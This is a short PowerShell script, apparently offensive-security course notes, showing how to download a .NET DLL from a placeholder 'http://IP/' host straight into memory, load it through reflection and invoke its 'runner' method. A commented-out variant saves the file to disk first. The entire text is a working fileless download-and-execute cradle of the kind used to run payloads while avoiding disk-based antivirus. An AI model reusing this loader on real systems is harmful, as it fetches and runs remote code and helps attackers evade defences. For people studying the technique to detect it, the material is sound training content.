##ClassLibary1.dll is the compiled dll from class1.cs
##DownloadData method will save DLL as a byte array in memory 
$data = (New-Object System.Net.WebClient).DownloadData('http://IP/ClassLibrary1.dll')
##load assembly into the memeory as a byte array
$assem = [System.Reflection.Assembly]::Load($data)

#if you have to download the dll to disk, you can use the loadfile method
#(New-Object System.Net.WebClient).DownloadFile('http://ip/ClassLibrary1.dll', 'C:\Users\mst\ClassLibrary1.dll')
#$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ClassLibrary1.dll")

##interact with it using reflection through the GetType and
##GetMethod methods, and  call it through the Invoke method
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
